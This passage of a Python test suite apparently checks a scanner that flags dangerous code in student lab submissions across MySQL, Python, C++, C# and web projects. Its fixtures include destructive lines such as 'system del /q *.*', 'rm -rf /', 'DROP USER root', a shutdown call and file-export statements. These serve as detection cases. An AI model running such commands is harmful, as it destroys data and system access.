SELECT b.title, a.name FROM books b JOIN authors a ON a.id = b.author_id ORDER BY b.title;
DROP TABLE IF EXISTS tmp_report;
''',
    "процедуры и триггеры": '''
CREATE DATABASE IF NOT EXISTS shop;
USE shop;
CREATE TABLE goods (id INT PRIMARY KEY, name VARCHAR(50), price DECIMAL(8,2), qty INT);
CREATE TABLE log (msg VARCHAR(200), at DATETIME);
DELIMITER //
CREATE PROCEDURE expensive(IN lim DECIMAL(8,2))
BEGIN
  SELECT name, price FROM goods WHERE price > lim;
END //
CREATE TRIGGER goods_ins AFTER INSERT ON goods FOR EACH ROW
BEGIN
  INSERT INTO log VALUES (CONCAT('Добавлен ', NEW.name), NOW());
END //
DELIMITER ;
CALL expensive(100);
CREATE VIEW cheap AS SELECT * FROM goods WHERE price < 50;
''',
    "запросы и information_schema": '''
USE college;
SELECT group_name, COUNT(*) AS cnt, AVG(score) AS avg_score
FROM students GROUP BY group_name HAVING AVG(score) > 7;
SELECT table_name FROM information_schema.tables WHERE table_schema = 'college';
UPDATE students SET score = score + 1 WHERE id IN (SELECT id FROM winners);
DELETE FROM students WHERE score IS NULL;
SHOW TABLES;
''',
}

SQL_BAD = {
    "DROP DATABASE чужой": ("DROP DATABASE world;", "баз"),
    "DROP SCHEMA системной": ("CREATE DATABASE mysql2;\nDROP SCHEMA IF EXISTS `sys`;", "баз"),
    "CREATE USER": ("CREATE USER 'student'@'localhost' IDENTIFIED BY '123';", "пользоват"),
    "GRANT": ("GRANT SELECT, INSERT ON shop.* TO 'student'@'localhost';", "пользоват"),
    "DROP USER": ("DROP USER 'root'@'%';", "пользоват"),
    "mysql.user": ("SELECT user, host FROM mysql.user;", "mysql"),
    "USE mysql": ("USE mysql;\nSHOW TABLES;", "mysql"),
    "LOAD DATA LOCAL": ("LOAD DATA LOCAL INFILE 'C:/data.csv' INTO TABLE t FIELDS TERMINATED BY ';';", "файл"),
    "INTO OUTFILE": ("SELECT * FROM goods INTO OUTFILE '/tmp/goods.txt';", "файл"),
    "SET GLOBAL": ("SET GLOBAL max_connections = 1000;", "настройки"),
    "system в клиенте": ("SELECT 1;\nsystem del /q *.*\n", "запускает"),
}


@pytest.mark.parametrize("name", SQL_CLEAN)
def test_mysql_clean(name):
    assert scan(plan("mysql", SQL_CLEAN[name])) == []


@pytest.mark.parametrize("name", SQL_BAD)
def test_mysql_dangerous(name):
    code, word = SQL_BAD[name]
    found = scan(plan("mysql", code))
    assert found and any(word in r for r in found), found


# ---------- общее ----------

def test_reasons_name_file_and_line_in_russian():
    code = "import os\n\nprint('Привет')\nos.system('calc')\n"
    found = scan(plan("python", code))
    assert len(found) == 1
    assert "main.py" in found[0] and "строка 4" in found[0] and "os.system" in found[0]
    assert re.search("[а-яё]", found[0])


def test_same_problem_reported_once_per_line():
    found = scan(plan("python", "import subprocess\nsubprocess.run(['a']); subprocess.run(['b'])\n"))
    assert len(found) == len(set(found))


def test_data_files_are_not_scanned():
    p = plan("python", "print(open('notes.txt', encoding='utf-8').read())\n",
             {"notes.txt": "os.system('rm -rf /') и C:\\Windows — это просто текст", "data.json": '{"cmd": "eval(x)"}'})
    assert scan(p) == []


def test_sql_in_strings_of_other_languages():
    code = 'import sqlite3\ncur.execute("DROP DATABASE students")\n'
    assert any("баз" in r for r in scan(plan("python", code)))
    own = 'cur.execute("DROP DATABASE IF EXISTS lab5")\ncur.execute("CREATE DATABASE lab5")\n'
    assert scan(plan("python", own)) == []


def test_english_ui_strings_are_not_sql():
    body = ('Console.WriteLine("Shutdown the computer?"); Console.WriteLine("Set global options");\n'
            'Console.WriteLine("Create user account"); Console.WriteLine("Use mysql workbench to check");\n'
            'Console.WriteLine("Select an item"); Console.WriteLine("Set password for the profile");')
    assert scan(plan("csharp", cs_main(body))) == []


def test_cpp_system_shutdown_is_one_reason():
    code = '#include <cstdlib>\nint main() { system("shutdown /s /t 0"); }\n'
    found = scan(plan("cpp", code))
    assert len(found) == 1 and "запускает" in found[0]


def test_cpp_allowed_console_commands():
    code = ('#include <cstdlib>\nint main() {\n system("chcp 1251");\n system("color 0A");\n'
            ' system("title Калькулятор");\n system("pause > nul");\n system("CLS");\n}\n')
    assert scan(plan("cpp", code)) == []


def test_user_class_named_process_is_fine():
    code = cs_main('var p = new Process(1, "Редактор", 30); p.Run(); Console.WriteLine(p.Name);').replace(
        "class Program", "class Process { public Process(int id, string n, int t) { Name = n; } "
                         "public string Name; public void Run() { } }\nclass Program")
    assert scan(plan("csharp", code)) == []


def test_attribute_calls_named_eval_or_exec_are_fine():
    code = "import sys\nfrom PyQt5.QtWidgets import QApplication\napp = QApplication(sys.argv)\nmodel.eval()\nsys.exit(app.exec())\n"
    assert scan(plan("python", code, kind="gui")) == []


def test_express_routes_are_not_paths():
    code = ('const express = require("express");\nconst app = express();\n'
            'app.get("/home", (req, res) => res.send("Главная"));\napp.get("/users/:id", (q, r) => r.json({}));\n'
            'app.listen(3000);\n')
    assert scan(plan("javascript", code)) == []


def test_sql_column_named_system_is_not_client_command():
    code = "CREATE DATABASE pcs;\nUSE pcs;\nCREATE TABLE computers (\n  id INT PRIMARY KEY,\n  system VARCHAR(50)\n);\n"
    assert scan(plan("mysql", code)) == []


def test_local_socket_server_is_fine_for_python():
    code = ('import socket\nserver = socket.socket()\nserver.bind(("127.0.0.1", 9090))\nserver.listen(1)\n'
            'print("Сервер запущен")\n')
    assert scan(plan("python", code)) == []


def test_shot_url_outside_localhost_is_flagged():
    from forlabs.runner.plan import ShotPlan, ShotStep

    p = plan("web", "<!doctype html><html><body>Привет</body></html>")
    p.shots = [ShotPlan(section=1, block=1, mode="browser", url="https://example.com")]
    assert any("сет" in r for r in scan(p))
    p.shots = [ShotPlan(section=1, block=1, mode="browser", url="index.html",
                        steps=[ShotStep(action="open", value="http://localhost:8000/about.php")])]
    assert scan(p) == []
